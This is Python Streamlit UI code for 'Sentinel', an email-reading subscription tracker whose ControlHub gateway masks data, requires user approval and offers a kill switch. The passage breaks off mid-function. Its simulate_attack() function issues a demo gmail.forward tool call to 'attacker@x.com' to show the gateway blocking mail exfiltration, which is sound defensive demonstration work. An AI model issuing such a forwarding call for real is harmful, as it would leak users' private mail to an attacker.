import asyncio
import html
import json
import os
import re
import sqlite3
from datetime import datetime, timedelta
from pathlib import Path

os.environ.setdefault("FAKE_MODE", "1")

import pandas as pd
import plotly.express as px
import streamlit as st
import streamlit.components.v1 as components

from agent.pipeline import run_scan
from controlhub import approvals, audit, storage
from controlhub.gateway import Gateway, REDACTOR_IS_STUB
from shared.schemas import Proposal

st.set_page_config(page_title="Sentinel", page_icon="🛡️", layout="wide", initial_sidebar_state="expanded")

ss = st.session_state
ss.setdefault("stage", "landing")
ss.setdefault("user", "")
if "gw" not in ss:
    ss.gw = Gateway()
gw = ss.gw

PAGES = ["🏠 Home", "📊 Dashboard", "📥 Inbox", "✅ Approval Queue", "📅 Renewal Timeline", "👁️ What the AI Saw", "🧾 Audit Log"]
ss.setdefault("page", PAGES[0])

HIDE_SIDEBAR = """
<style>
[data-testid="stSidebar"], [data-testid="stSidebarCollapsedControl"] {display: none;}
</style>
"""

# ====================== FRONTEND SKIN (design only) ======================
# Palette (complementary): forest green = trust/money, vermilion = leaks/alerts, warm paper = calm base.
CSS = """
<style>
@import url('https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,800&family=IBM+Plex+Mono:wght@400;500&family=Instrument+Sans:wght@400;500;600&display=swap');
:root{--bg:#F4EFE4;--ink:#10231D;--mut:#55665D;--card:#FBF8F1;--line:#D8D0BC;--pan:#12392E;--pan2:#1D4A3C;--al:#E8472B;--ok:#2E8B57}
.stApp{background:var(--bg);font-family:'Instrument Sans',system-ui,sans-serif}
.stApp,.stApp p,.stApp li,.stApp label,.stApp summary{color:var(--ink)}
header[data-testid="stHeader"]{background:transparent}
.block-container{max-width:1080px;padding-top:2.4rem}
h1,h2,h3,h4{font-family:'Bricolage Grotesque','Arial Black',sans-serif!important;letter-spacing:-.03em;color:var(--ink)!important;font-weight:800!important}
[data-testid="stCaptionContainer"],[data-testid="stCaptionContainer"] p{color:var(--mut)!important}
.stButton>button,.stDownloadButton>button{border-radius:999px;border:1.5px solid var(--ink);background:transparent;font-weight:600;padding:.5rem 1.3rem;transition:transform .2s,box-shadow .2s}
.stButton>button:hover,.stDownloadButton>button:hover{transform:translateY(-2px);box-shadow:0 6px 0 -2px var(--al);border-color:var(--ink)}
.stButton>button:active{transform:scale(.97)}
.stApp .stButton button p,.stApp .stDownloadButton button p{color:inherit!important}
.stButton>button[kind="primary"],.stButton>button[data-testid="stBaseButton-primary"]{background:var(--pan);border-color:var(--pan);color:var(--bg)!important}
.stApp .stButton button[kind="primary"] p,.stApp .stButton button[data-testid="stBaseButton-primary"] p{color:var(--bg)!important}
.stApp input,.stApp textarea{background:var(--card)!important;color:var(--ink)!important}
[data-baseweb="input"],[data-baseweb="textarea"],[data-baseweb="base-input"]{background:var(--card)!important;border-radius:12px!important;border-color:var(--line)!important}
div[data-testid="stVerticalBlockBorderWrapper"]{border-color:var(--ink)!important;border-radius:20px!important}
[data-testid="stExpander"]{border:1.5px solid var(--ink)!important;border-radius:16px!important;background:var(--card)}
[data-testid="stAlert"]{border-radius:14px}
[data-testid="stMetric"]{background:var(--card);border:1.5px solid var(--ink);border-radius:18px;padding:16px 18px}
[data-testid="stMetricValue"]{font-family:'Bricolage Grotesque',sans-serif;color:var(--al)!important}
div[role="radiogroup"]{gap:8px;flex-wrap:wrap}
div[role="radiogroup"] label{background:var(--card);border:1.5px solid var(--ink);border-radius:999px;padding:6px 16px;cursor:pointer;transition:transform .2s,box-shadow .2s}
div[role="radiogroup"] label>div:first-child{display:none}
div[role="radiogroup"] label:hover{transform:translateY(-2px);box-shadow:0 5px 0 -2px var(--al)}
div[role="radiogroup"] label:has(input:checked){background:var(--pan);border-color:var(--pan)}
div[role="radiogroup"] label:has(input:checked) p{color:var(--bg)!important}
[data-testid="stSidebar"]{background:var(--pan)}
.stApp [data-testid="stSidebar"] *{color:#F4EFE4!important}
.stApp [data-testid="stSidebar"] [data-testid="stSidebarCollapseButton"] *,.stApp [data-testid="stSidebarCollapsedControl"] *{color:#12392E!important;fill:#12392E!important}
[data-testid="stSidebar"] .stButton>button{border-color:#F4EFE4;background:transparent}
[data-testid="stSidebar"] .stButton>button[kind="primary"],[data-testid="stSidebar"] .stButton>button[data-testid="stBaseButton-primary"]{background:var(--al);border-color:var(--al)}
[data-testid="stSidebar"] .stButton>button[kind="primary"] p,[data-testid="stSidebar"] .stButton>button[data-testid="stBaseButton-primary"] p{color:#12392E!important}
[data-testid="stSidebar"] hr{border-color:#1D4A3C}
@property --n{syntax:'<integer>';initial-value:0;inherits:false}
@keyframes cnt{from{--n:0}to{--n:var(--t)}}
@keyframes rise{from{opacity:0;transform:translateY(18px)}}
@keyframes pl{50%{transform:scale(1.07)}}
.eyebrow{font:500 .76rem 'IBM Plex Mono',monospace;letter-spacing:.14em;text-transform:uppercase;color:var(--al);display:block;margin-bottom:6px}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:16px;margin:10px 0 26px}
.stat{background:var(--pan);color:#F4EFE4;border-radius:18px;padding:18px 20px;box-shadow:6px 6px 0 var(--al);animation:rise .7s cubic-bezier(.2,.8,.2,1) both}
.stat:nth-child(2){animation-delay:.08s}.stat:nth-child(3){animation-delay:.16s}.stat:nth-child(4){animation-delay:.24s}
.num{display:block;font:800 2.7rem/1 'Bricolage Grotesque',sans-serif;letter-spacing:-.03em;counter-reset:n var(--n);animation:cnt 1.3s cubic-bezier(.2,.8,.2,1) both}
.num::after{content:counter(n)}
.stat small{font:500 .7rem 'IBM Plex Mono',monospace;letter-spacing:.1em;text-transform:uppercase;opacity:.78;display:block;margin-top:8px}
.chip{display:inline-block;background:var(--al);color:#12392E;font:500 .72rem 'IBM Plex Mono',monospace;border-radius:6px;padding:3px 9px;margin:0 6px 6px 0}
.src{font:400 .84rem 'IBM Plex Mono',monospace;color:var(--mut);border-left:3px solid var(--al);padding:2px 0 2px 12px;margin:4px 0 10px}
.trust{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin:26px 0 20px}
.tc{background:var(--card);border:1.5px solid var(--ink);border-radius:18px;padding:18px 12px;text-align:center;font-weight:600;transition:transform .25s cubic-bezier(.34,1.56,.64,1),box-shadow .25s;animation:rise .8s cubic-bezier(.2,.8,.2,1) both}
.tc:nth-child(2){animation-delay:.1s}.tc:nth-child(3){animation-delay:.2s}
.tc:hover{transform:translateY(-6px) rotate(-.8deg);box-shadow:6px 8px 0 var(--al)}
.tc span{display:block;font-size:1.7rem;margin-bottom:4px}
.lp{text-align:center;font-size:1.12rem;color:var(--mut)}
[data-testid="stToolbar"]{display:none}
[data-testid="stSidebarCollapseButton"]{opacity:1!important;visibility:visible!important}
[data-testid="stSidebarCollapseButton"] button,[data-testid="stSidebarCollapsedControl"] button{background:var(--al)!important;border-radius:10px!important}
[data-testid="stSidebarCollapseButton"] svg,[data-testid="stSidebarCollapsedControl"] svg{color:#12392E!important;fill:#12392E!important}
[data-testid="stSidebar"] div[role="radiogroup"]{flex-direction:column;flex-wrap:nowrap;gap:6px}
[data-testid="stSidebar"] div[role="radiogroup"] label{background:transparent;border:1.5px solid transparent;border-radius:12px;padding:10px 14px;width:100%;box-shadow:none}
[data-testid="stSidebar"] div[role="radiogroup"] label:hover{background:var(--pan2);transform:none;box-shadow:none}
[data-testid="stSidebar"] div[role="radiogroup"] label:has(input:checked){background:var(--pan2);border-color:var(--al)}
[data-testid="stSidebar"] div[role="radiogroup"] label:has(input:checked) p{color:#F4EFE4!important}
[data-testid="stSidebar"] div[role="radiogroup"] label:nth-child(6){margin-top:34px;position:relative}
[data-testid="stSidebar"] div[role="radiogroup"] label:nth-child(6)::before{content:"TRUST + SAFETY";position:absolute;top:-26px;left:4px;font:500 .68rem 'IBM Plex Mono',monospace;letter-spacing:.18em;opacity:.65}
.brand{display:flex;align-items:center;gap:12px;margin:4px 0 16px}.brand svg{width:40px;height:40px}
.brand b{font:800 1.45rem 'Bricolage Grotesque',sans-serif;letter-spacing:.08em;display:block}
.brand small{font:500 .62rem 'IBM Plex Mono',monospace;letter-spacing:.16em;opacity:.7;text-decoration:underline}
.ws{background:var(--pan2);border-radius:14px;padding:12px 14px;margin-bottom:6px}.ws b{display:block;font-size:.95rem}
.ws small{font:500 .62rem 'IBM Plex Mono',monospace;letter-spacing:.14em;opacity:.7;text-transform:uppercase}
.nvl{display:block;font:500 .68rem 'IBM Plex Mono',monospace;letter-spacing:.18em;text-transform:uppercase;opacity:.65;margin:18px 0 8px}
.sc{background:var(--pan2);border-radius:14px;padding:14px 16px;margin:14px 0;font-size:.88rem}.sc b{display:block;margin-bottom:4px}
.tb{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px}.crumb{color:var(--mut)}.crumb b{color:var(--ink)}
.pill{font:500 .68rem 'IBM Plex Mono',monospace;letter-spacing:.1em;text-transform:uppercase;background:var(--card);border:1px solid var(--line);border-radius:8px;padding:6px 12px;color:var(--ink)}
.pill i{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--ok);margin-right:8px}
.av{display:inline-grid;place-items:center;width:38px;height:38px;border-radius:50%;background:var(--pan);color:var(--bg);font:800 .8rem 'Bricolage Grotesque',sans-serif;margin-left:12px}
.banner{background:var(--card);border:1px solid var(--line);border-left:4px solid var(--al);border-radius:12px;padding:12px 16px;font-size:.92rem;margin-bottom:16px;animation:rise .6s both}
.mkw{background:var(--card);border:1.5px solid var(--ink);border-radius:16px;padding:14px 18px;margin-top:12px}
.mkw>b{display:block;margin-bottom:6px}
.mk{display:flex;align-items:center;gap:12px;flex-wrap:wrap;padding:8px 0;border-top:1px solid var(--line)}
.mk code{font:500 .84rem 'IBM Plex Mono',monospace;background:transparent;color:var(--ink)}
.tg{background:var(--al);color:#12392E;border-radius:5px;padding:1px 8px;font:500 .8rem 'IBM Plex Mono',monospace}
@media(max-width:700px){.trust{grid-template-columns:1fr}}
@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
</style>
"""
st.markdown(CSS, unsafe_allow_html=True)

HERO_HTML = """
<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,800&family=IBM+Plex+Mono:wght@500&display=swap" rel="stylesheet">
<style>
body{margin:0;background:transparent;text-align:center;color:#10231D;font-family:'Bricolage Grotesque','Arial Black',sans-serif;overflow:hidden}
h1,h2{margin:0;font-weight:800;letter-spacing:-.03em;line-height:1.02}
h1{font-size:clamp(2.6rem,9vw,5.8rem);padding-top:34px}
h2{font-size:clamp(1.5rem,4.4vw,2.9rem);margin-top:12px}
.ch{display:inline-block;opacity:0;transform:translateY(.45em);filter:blur(6px);animation:in .75s cubic-bezier(.2,.8,.2,1) forwards;animation-delay:calc(var(--i)*30ms)}
.wd{display:inline-block;white-space:nowrap}
@keyframes in{to{opacity:1;transform:none;filter:none}}
.mwrap{display:inline-block;overflow:hidden;vertical-align:bottom;color:#E8472B;padding-bottom:.08em}
#mw{display:inline-block;transition:transform .38s cubic-bezier(.5,0,.2,1),opacity .38s}
#mw.out{transform:translateY(-70%);opacity:0}#mw.pre{transition:none;transform:translateY(70%);opacity:0}
.tick{background:#12392E;color:#F4EFE4;overflow:hidden;padding:14px 0;margin-top:34px;border-radius:14px;font:500 .86rem 'IBM Plex Mono',monospace;letter-spacing:.05em}
.tr{display:flex;gap:44px;width:max-content;animation:sc 34s linear infinite}
.tr span::before{content:"\\25C6";color:#E8472B;margin-right:44px}
@keyframes sc{to{transform:translateX(-50%)}}
@media(prefers-reduced-motion:reduce){*{animation:none!important}.ch{opacity:1;transform:none;filter:none}}
</style>
<h1 id="h">Money leaks quietly.</h1>
<h2>Sentinel catches the <span class="mwrap"><span id="mw">forgotten trials.</span></span></h2>
<div class="tick"><div class="tr" id="tr"></div></div>
<script>
const h=document.getElementById('h'),t=h.textContent;h.textContent='';let i=0;
t.split(' ').forEach((w,k,a)=>{const s=document.createElement('span');s.className='wd';
[...w].forEach(c=>{const x=document.createElement('span');x.className='ch';x.style.setProperty('--i',i++);x.textContent=c;s.append(x)});
h.append(s);if(k<a.length-1){h.append(' ');i++}});
const W=['forgotten trials.','price hikes.','buried bills.','sneaky renewals.'];let n=0;const mw=document.getElementById('mw');
setInterval(()=>{mw.className='out';setTimeout(()=>{n=(n+1)%W.length;mw.textContent=W[n];mw.className='pre';void mw.offsetWidth;mw.className=''},400)},2600);
const T=['Free trial ends in 2 days','Price hike: Rs. 499 to Rs. 649','Bill due 5 Dec','Allow \\u00b7 Ask \\u00b7 Block','Gmail read-only','No bank. No UPI.','Drafts, never sends','You approve every action'];
document.getElementById('tr').innerHTML=[...T,...T].map(x=>'<span>'+x+'</span>').join('');
</script>
"""

CMP_HTML = """
<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
body{margin:0;background:transparent}
.c{position:relative;display:grid;border:1.5px solid #10231D;border-radius:18px;overflow:hidden;--p:50%;font:400 .86rem/1.7 'IBM Plex Mono',monospace;user-select:none}
pre{grid-area:1/1;margin:0;padding:34px 22px 22px;white-space:pre-wrap;word-break:break-word;font:inherit}
.raw{background:#FBF8F1;color:#10231D}
.red{background:#12392E;color:#F4EFE4;clip-path:inset(0 0 0 var(--p))}
.tg{background:#E8472B;color:#12392E;border-radius:5px;padding:1px 6px;font-weight:500}
.lab{position:absolute;top:9px;font:500 .64rem 'IBM Plex Mono',monospace;letter-spacing:.14em;text-transform:uppercase;opacity:.7;z-index:2}
.hd{position:absolute;top:0;bottom:0;left:var(--p);width:3px;background:#E8472B;transform:translateX(-1.5px);pointer-events:none}
.hd::after{content:"\\21C4";position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:#E8472B;color:#12392E;border-radius:50%;width:38px;height:38px;display:grid;place-items:center;font:700 1rem sans-serif}
input{position:absolute;inset:0;width:100%;height:100%;opacity:0;cursor:ew-resize;margin:0}
</style>
<div class="c" id="c">
<span class="lab" style="left:14px;color:#10231D">Original (Gmail)</span><span class="lab" style="right:14px;color:#F4EFE4">Sent to the AI</span>
<pre class="raw">__O__</pre><pre class="red">__M__</pre><div class="hd"></div>
<input id="r" type="range" min="0" max="100" value="50" aria-label="Compare original and masked">
</div>
<script>
const c=document.getElementById('c'),r=document.getElementById('r');
r.oninput=()=>c.style.setProperty('--p',r.value+'%');
let s=performance.now();(function f(n){const p=Math.min(1,(n-s)/1400),v=95-45*(1-Math.pow(1-p,3));r.value=v;c.style.setProperty('--p',v+'%');if(p<1)requestAnimationFrame(f)})(s);
</script>
"""


HOME_HTML = """
<link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,800&family=IBM+Plex+Mono:wght@500&family=Instrument+Sans:wght@500;600&display=swap" rel="stylesheet">
<style>
body{margin:0;background:transparent;color:#10231D;font-family:'Instrument Sans',system-ui,sans-serif}
.w{box-sizing:border-box;display:grid;grid-template-columns:1.1fr .9fr;gap:30px;align-items:center;padding:34px 40px;background:#FBF8F1;border:1.5px solid #D8D0BC;border-radius:34px;min-height:540px;overflow:hidden}
.eb{display:flex;align-items:center;gap:10px;font:500 .72rem 'IBM Plex Mono',monospace;letter-spacing:.16em;text-transform:uppercase;color:#E8472B}
.eb i{width:10px;height:10px;border-radius:50%;background:#E8472B;animation:pl 2s ease-in-out infinite}
@keyframes pl{50%{transform:scale(1.5);opacity:.5}}
h1{font:800 clamp(2.4rem,5.6vw,4.8rem)/1 'Bricolage Grotesque','Arial Black',sans-serif;letter-spacing:-.045em;margin:18px 0 0}
.al{color:#E8472B}
.ch{display:inline-block;opacity:0;transform:translateY(.45em);filter:blur(6px);animation:in .75s cubic-bezier(.2,.8,.2,1) forwards;animation-delay:calc(var(--i)*28ms)}
.wd{display:inline-block;white-space:nowrap}
@keyframes in{to{opacity:1;transform:none;filter:none}}
.mwrap{display:inline-block;overflow:hidden;vertical-align:bottom;color:#E8472B;padding-bottom:.08em}
#mw{display:inline-block;transition:transform .38s cubic-bezier(.5,0,.2,1),opacity .38s}
#mw.out{transform:translateY(-70%);opacity:0}#mw.pre{transition:none;transform:translateY(70%);opacity:0}
.lead{margin:20px 0 0;max-width:46ch;color:#55665D;font-size:1.05rem;line-height:1.55}
.card{position:relative;background:#12392E;color:#F4EFE4;border-radius:28px;padding:24px 26px;box-shadow:12px 12px 0 #E8472B;animation:rise .9s .2s cubic-bezier(.2,.8,.2,1) both}
@keyframes rise{from{opacity:0;transform:translateY(24px)}}
.ct{display:flex;justify-content:space-between;font:500 .66rem 'IBM Plex Mono',monospace;letter-spacing:.1em;text-transform:uppercase;padding-bottom:14px;border-bottom:1px solid #1D4A3C}
.ct b{color:#E8472B}
.big{font:800 3.4rem/1 'Bricolage Grotesque',sans-serif;letter-spacing:-.04em;margin-top:22px}
.sm{font:400 .78rem 'IBM Plex Mono',monospace;opacity:.75;margin-top:8px}
.bars{display:flex;align-items:flex-end;gap:8px;height:96px;margin:22px 0 14px;padding-bottom:14px;border-bottom:1px solid #1D4A3C}
.bars span{flex:1;background:#E8472B;border-radius:6px 6px 2px 2px;height:0;transition:height 1s cubic-bezier(.2,.8,.2,1)}
.chg{display:flex;justify-content:space-between;align-items:center;font:500 .66rem 'IBM Plex Mono',monospace;letter-spacing:.1em;text-transform:uppercase}
.chg b{background:#E8472B;color:#12392E;border-radius:99px;padding:4px 10px}
.row{display:flex;align-items:center;gap:12px;background:#FBF8F1;color:#10231D;border-radius:16px;padding:12px 14px;margin-top:14px}
.lg{width:38px;height:38px;border-radius:10px;background:#FDE3DC;color:#E8472B;display:grid;place-items:center;font:800 1.2rem 'Bricolage Grotesque',sans-serif}
.row div:nth-child(2){flex:1}.row small{display:block;color:#55665D;font-size:.76rem}
.pr{text-align:right;font-weight:600}.pr s{display:block;color:#55665D;font-weight:400;font-size:.8rem}
.ask{position:absolute;top:64px;right:-16px;background:#FBF8F1;color:#12392E;border-radius:14px;padding:10px 16px;text-align:center;box-shadow:5px 5px 0 #E8472B;transform:rotate(3deg);animation:fl 3s ease-in-out infinite}
.ask span{font:500 .56rem 'IBM Plex Mono',monospace;letter-spacing:.14em;display:block}.ask b{font:800 1.6rem 'Bricolage Grotesque',sans-serif}.ask small{display:block;font-size:.66rem;opacity:.7}
@keyframes fl{50%{transform:rotate(3deg) translateY(-7px)}}
@media(max-width:760px){.w{grid-template-columns:1fr;padding:26px 22px}.ask{right:8px}}
@media(prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}.ch{opacity:1;transform:none;filter:none}}
</style>
<div class="w"><div>
<div class="eb"><i></i>Your quiet, local-first watchtower</div>
<h1><span class="fx">Money leaks</span> <span class="fx al">quietly.</span><br><span class="fx">Sentinel catches</span> <span class="mwrap"><span id="mw">forgotten trials.</span></span></h1>
<p class="lead">Sentinel reads your billing emails, finds hidden price hikes and ending trials, and drafts the reminder. Only after you approve.</p>
</div>
<div class="card"><div class="ask"><span>CONTROLHUB</span><b>ASK</b><small>approval first</small></div>
<div class="ct"><span>This scan · local backend</span><b>LIVE DATA</b></div>
<div class="big">Rs. <span id="tot">0</span></div><div class="sm">recurring spend / month (active plans)</div>
<div class="bars" id="bars"></div>
<div class="chg"><span>Waiting for you</span><b>__PEND__ pending</b></div>
__HIKE__
</div></div>
<script>
let i=0;document.querySelectorAll('.fx').forEach(el=>{const t=el.textContent;el.textContent='';
t.split(' ').forEach((w,k,a)=>{const s=document.createElement('span');s.className='wd';
[...w].forEach(c=>{const x=document.createElement('span');x.className='ch';x.style.setProperty('--i',i++);x.textContent=c;s.append(x)});
el.append(s);if(k<a.length-1){el.append(' ');i++}})});
const B=__BARS__,bw=document.getElementById('bars');B.forEach(h=>{const s=document.createElement('span');bw.append(s);setTimeout(()=>s.style.height=h+'%',300)});
const T=__TOTAL__,tt=document.getElementById('tot'),t0=performance.now();
(function f(n){const p=Math.min(1,(n-t0)/1400);tt.textContent=Math.round(T*(1-Math.pow(1-p,3))).toLocaleString('en-IN');if(p<1)requestAnimationFrame(f)})(t0);
const W=['forgotten trials.','price hikes.','buried bills.','sneaky renewals.'];let n=0;const mw=document.getElementById('mw');
setInterval(()=>{mw.className='out';setTimeout(()=>{n=(n+1)%W.length;mw.textContent=W[n];mw.className='pre';void mw.offsetWidth;mw.className=''},400)},2600);
</script>
"""


def home_view():
    subs = storage.list_subscriptions()
    latest = {}
    for sb in sorted(subs, key=lambda x: x.renewal_date or ""):
        latest[sb.merchant] = sb
    vals = [float(sb.amount or 0) for sb in latest.values()][:10]
    total = sum(float(sb.amount or 0) for sb in latest.values() if sb.status == "active")
    top = max(vals) if vals and max(vals) > 0 else 1
    bars = [max(12, int(v / top * 100)) for v in vals] or [14, 22, 18, 30, 26, 40]
    hike = next((sb for sb in subs if sb.old_amount is not None), None)
    if hike:
        hike_html = (f"<div class='row'><div class='lg'>{html.escape(hike.merchant[:1].upper())}</div>"
                     f"<div><b>{html.escape(hike.merchant)}</b><small>price hike caught</small></div>"
                     f"<div class='pr'><s>Rs. {float(hike.old_amount):g}</s>Rs. {float(hike.amount):g}</div></div>")
    else:
        hike_html = ("<div class='row'><div class='lg'>✓</div><div><b>No price hike caught yet</b>"
                     "<small>Click Scan inbox in the sidebar</small></div></div>")
    page = (HOME_HTML.replace("__TOTAL__", str(int(total))).replace("__BARS__", json.dumps(bars))
            .replace("__PEND__", str(len(approvals.list_all("pending")))).replace("__HIKE__", hike_html))
    components.html(page, height=620)


def goto(p):
    ss.page = p


def nav_label(p):
    # Keep labels constant: changing them would make Streamlit reset the selected page after every approve.
    return p


def chips(flags):
    return "".join(f"<span class='chip'>⚠ {html.escape(str(f))}</span>" for f in flags)


def compare_view(original, masked):
    o = html.escape(original or "")
    m = re.sub(r"\[[A-Z_]+_\d+\]", lambda x: f"<span class='tg'>{x.group(0)}</span>", html.escape(masked or ""))
    h = min(560, max(200, 90 + int(max(len(original or ""), len(masked or "")) / 60) * 24))
    components.html(CMP_HTML.replace("__O__", o).replace("__M__", m), height=h, scrolling=True)


def stats_strip():
    subs = storage.list_subscriptions()
    items = [
        ("Billing emails read", len({v["id"] for v in gw.views})),
        ("Subscriptions found", len(subs)),
        ("Price hikes caught", sum(1 for s in subs if "price_hike" in s.flags)),
        ("Waiting for you", len(approvals.list_all("pending"))),
    ]
    st.markdown(
        "<div class='stats'>" + "".join(
            f"<div class='stat'><span class='num' style='--t:{n}'></span><small>{label}</small></div>"
            for label, n in items) + "</div>",
        unsafe_allow_html=True,
    )


# ====================== Backend helpers (unchanged) ======================
def run(coro):
    return asyncio.run(coro)


def go(stage: str):
    ss.stage = stage
    st.rerun()


def flash(kind: str, msg: str):
    ss.flash = (kind, msg)
    st.rerun()


_dialog = getattr(st, "dialog", None) or getattr(st, "experimental_dialog", None)


def popup(title: str, kind: str, lines: list):
    """Shows a real popup window. Falls back to a toast on very old Streamlit versions."""
    if _dialog is None:
        st.toast(f"{title}: {lines[0]}", icon="🛑")
        return

    @_dialog(title)
    def _d():
        getattr(st, kind)(lines[0])
        for line in lines[1:]:
            st.write(line)
        if st.button("Close", key="dlg_close"):
            st.rerun()

    _d()


def simulate_attack():
    res = run(gw.call("gmail.forward", {"to": "attacker@x.com"}))
    popup("🛑 Blocked by ControlHub", "error", [
        "The agent tried to forward all your mail to attacker@x.com, and ControlHub stopped it.",
        "**Tool:** gmail.forward",
        f"**Decision:** {res['status'].upper()}",
        f"**Why:** {res.get('reason', '')}",
        "This attempt was recorded in the Audit Log. Nothing was sent.",
    ])


# ====================== Landing ======================
def landing():
    components.html(HERO_HTML, height=330)
    _, mid, _ = st.columns([1, 2.4, 1])
    with mid:
        st.markdown(
            "<p class='lp'>Sentinel finds hidden price hikes, ending free trials and upcoming bills in your emails, "
            "and prepares reminders and cancellation drafts for you.</p>"
            "<p class='lp'>Its ControlHub shield masks your private details, blocks malicious emails, "
            "and never does anything without your approval.</p>"
            "<div class='trust'>"
            "<div class='tc'><span>🏦</span>No bank access</div>"
            "<div class='tc'><span>💻</span>Data stays on your laptop</div>"
            "<div class='tc'><span>✅</span>You approve every action</div>"
            "</div>",
            unsafe_allow_html=True,
        )
        if st.button("Open Sentinel" if ss.user else "Get started", type="primary", use_container_width=True):
            go("app" if ss.user else "login")


# ====================== Login ======================
def login():
    st.write("")
    _, mid, _ = st.columns([1, 1.6, 1])
    with mid:
        with st.container(border=True):
            st.markdown("<span class='eyebrow'>Step 1 of 2</span><h2 style='margin:0'>🛡️ Sign in to Sentinel</h2>",
                        unsafe_allow_html=True)
            st.caption("Connect your Gmail so Sentinel can look for subscriptions, trials and bills.")
            email = st.text_input("Google account", value="demo.sentinel@gmail.com")
            if st.button("🔐 Sign in with Google", type="primary", use_container_width=True):
                if email.strip():
                    ss.user = email.strip()
                    go("consent")
                else:
                    st.error("Enter an email address.")
            st.caption("Demo mode: Sentinel uses a sample inbox. No password is asked or stored.")
            if st.button("← Back"):
                go("landing")


# ====================== Consent ======================
def consent():
    st.write("")
    _, mid, _ = st.columns([1, 1.8, 1])
    with mid:
        with st.container(border=True):
            st.markdown("<span class='eyebrow'>Step 2 of 2</span>"
                        "<h3 style='margin:0'>Sentinel wants access to your Google Account</h3>",
                        unsafe_allow_html=True)
            st.caption(f"Signed in as {ss.user}")
            st.markdown("**Sentinel will be able to:**")
            st.markdown(
                "- ✅ Read your billing emails (read-only)\n"
                "- ✅ Create **drafts** in Gmail (it can never send)\n"
                "- ✅ Add reminders to your Google Calendar"
            )
            st.markdown("**Sentinel will never:**")
            st.markdown(
                "- 🚫 Send or forward email\n"
                "- 🚫 Touch your bank, cards or UPI\n"
                "- 🚫 Store your raw emails\n"
                "- 🚫 Act without your approval"
            )
            st.caption("You can revoke access any time with the Kill switch.")
            c1, c2 = st.columns(2)
            if c1.button("Allow", type="primary", use_container_width=True):
                audit.log("user", "grant_access", "google", "allow", "read-only mail, drafts, calendar events")
                ss.auto_scan = True
                ss.page = PAGES[0]
                go("app")
            if c2.button("Cancel", use_container_width=True):
                go("login")


# ====================== Sidebar ======================
def sidebar():
    with st.sidebar:
        st.markdown(
            "<div class='brand'><svg viewBox='0 0 32 32'><path d='M16 2l12 4v9c0 8-5 13-12 15C9 28 4 23 4 15V6z' "
            "fill='none' stroke='#F4EFE4' stroke-width='1.8'/><path d='M10 16l4 4 8-9' fill='none' stroke='#E8472B' "
            "stroke-width='3' stroke-linecap='round' stroke-linejoin='round'/></svg>"
            "<div><b>SENTINEL</b><small>CONTROLHUB / LOCAL</small></div></div>"
            f"<div class='ws'><b>Personal space</b><small>{html.escape(ss.user)}</small></div>"
            "<span class='nvl'>Workspace</span>",
            unsafe_allow_html=True,
        )
        st.radio("Navigate", PAGES, key="page", label_visibility="collapsed", format_func=nav_label)
        st.markdown("<span class='nvl'>Actions</span>", unsafe_allow_html=True)
        st.caption("Mode: " + ("sample inbox (demo)" if os.getenv("FAKE_MODE", "1") == "1" else "LIVE Google data"))
        st.caption("Redactor: " + ("STUB (nothing masked)" if REDACTOR_IS_STUB else "active"))
        st.caption("Everything stays on this laptop. No bank access.")
        if st.button("🔍 Scan inbox", type="primary"):
            with st.spinner("Reading billing emails through ControlHub..."):
                r = run(run_scan(gw))
            if r["status"] == "ok":
                flash("success", f"Found {len(r['subscriptions'])} subscriptions, {len(r['proposals'])} new proposals.")
            else:
                flash("error", r.get("reason", "Scan failed"))
        st.divider()
        if gw.killed:
            st.error("KILL SWITCH ACTIVE: all access revoked")
            if st.button("Resume access"):
                gw.killed = False
                audit.log("user", "resume", "-", "allow", "access restored")
                st.rerun()
        else:
            if st.button("🛑 Kill switch"):
                gw.kill()
                Path("token.json").unlink(missing_ok=True)
                popup("🛑 Access revoked", "warning", [
                    "Sentinel can no longer read or change anything.",
                    "Every call is now rejected and logged. Use 'Resume access' to turn it back on.",
                ])
        st.divider()
        st.subheader("Your data")
        subs_all = storage.list_subscriptions()
        if subs_all:
            csv = pd.DataFrame([s.model_dump() for s in subs_all]).to_csv(index=False)
            st.download_button("⬇️ Export tracker (CSV)", csv, "sentinel_tracker.csv", "text/csv")
        confirm = st.checkbox("I want to delete ALL my data")
        if st.button("🗑️ Wipe everything", disabled=not confirm):
            storage.wipe_all()
            audit.DB_PATH.unlink(missing_ok=True)
            Path("token.json").unlink(missing_ok=True)
            gw.views.clear()
            flash("success", "All local data wiped.")
        st.divider()
        st.markdown("<div class='sc'><b>Your money stays yours.</b>No bank access. No sending. "
                    "Local-first, by design.</div>", unsafe_allow_html=True)
        if st.button("← Landing page"):
            go("landing")
        if st.button("Sign out"):
            ss.user = ""
            go("landing")


# ====================== Pages ======================
def page_home():
    mode = ("sample inbox mode. Bundled fixtures only; no live Gmail, Calendar or model access."
            if os.getenv("FAKE_MODE", "1") == "1" else "live mode with your Google account.")
    st.markdown(f"<div class='banner'>Connected to the local Python backend (ControlHub) in {mode}</div>",
                unsafe_allow_html=True)
    home_view()
    st.markdown(
        "<div class='trust'>"
        "<div class='tc'><span>🏦</span>No bank access</div>"
        "<div class='tc'><span>💻</span>Data stays on your laptop</div>"
        "<div class='tc'><span>✅</span>You approve every action</div></div>",
        unsafe_allow_html=True,
    )
    b1, b2, _ = st.columns([1.2, 1.2, 2])
    b1.button("Review approval queue →", type="primary", on_click=goto, args=(PAGES[3],), key="h_q")
    b2.button("See what the AI saw", on_click=goto, args=(PAGES[5],), key="h_s")


def page_dashboard():
    st.subheader("Dashboard")
    stats_strip()
    pending = approvals.list_all("pending")
    left, right = st.columns(2)
    with left:
        st.markdown("**Next up for your approval**")
        if not pending:
            st.caption("Nothing pending.")
        for p in pending[:4]:
            st.markdown(f"<div class='src'>{html.escape(p.title)}</div>" + chips(p.flags), unsafe_allow_html=True)
        st.button("Open approval queue →", on_click=goto, args=(PAGES[3],), key="d_q")
    with right:
